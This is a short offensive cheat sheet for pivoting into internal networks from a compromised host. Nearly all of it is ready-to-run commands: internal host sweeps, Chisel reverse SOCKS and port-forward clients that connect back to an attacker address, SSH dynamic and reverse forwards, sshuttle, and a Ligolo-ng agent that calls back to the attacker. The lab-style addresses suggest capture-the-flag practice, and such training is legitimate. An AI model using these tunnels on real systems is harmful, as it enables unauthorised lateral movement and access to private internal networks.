# Pivoting & tunneling cheat sheet

You popped a box with a second NIC into an internal network. Now reach it.

## Discover the internal network
```bash
ip a; arp -a; cat /etc/hosts
ip route                                   # which subnets does this box see?
# Fast host sweep without nmap on target:
for i in $(seq 1 254); do (ping -c1 -W1 172.16.0.$i >/dev/null && echo 172.16.0.$i up &); done
```

## Chisel (fast, single binary — the go-to)
```bash
# Attacker (server):
./chisel server -p 8000 --reverse

# Victim (client) — SOCKS proxy back through the box:
./chisel client 10.10.14.5:8000 R:socks
# Then on attacker, via proxychains (set socks5 127.0.0.1:1080 in /etc/proxychains4.conf):
proxychains nmap -sT -Pn 172.16.0.10
proxychains netexec smb 172.16.0.0/24

# Single remote port forward (reach internal 172.16.0.10:3306 as local 3306):
./chisel client 10.10.14.5:8000 R:3306:172.16.0.10:3306
```

## SSH tunneling (when you have SSH creds)
```bash
# Dynamic SOCKS proxy
ssh -D 1080 -N user@pivot                  # proxychains everything through it
# Local forward: reach internal:3306 on your localhost:3306
ssh -L 3306:172.16.0.10:3306 user@pivot
# Remote forward: expose your local :80 to the pivot
ssh -R 80:127.0.0.1:80 user@pivot
# No shell wanted: add -N.  Reverse SOCKS from a box you shelled: ssh -R 1080 ...
```

## sshuttle (transparent VPN-like, no proxychains)
```bash
sshuttle -r user@pivot 172.16.0.0/24 -x pivot
```

## Ligolo-ng (modern, TUN interface — cleanest)
```bash
# Attacker:
sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
./proxy -selfcert
# Victim:
./agent -connect 10.10.14.5:11601 -ignore-cert
# In proxy console: session, then `start`. Add route:
sudo ip route add 172.16.0.0/24 dev ligolo
# Now hit internal hosts directly, no proxychains.
```

## proxychains tips
- `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`, and `quiet_mode` to reduce noise.
- Use `-sT` (TCP connect) with nmap through proxychains — SYN scans don't tunnel.
- UDP doesn't traverse SOCKS; use ligolo/sshuttle for that.
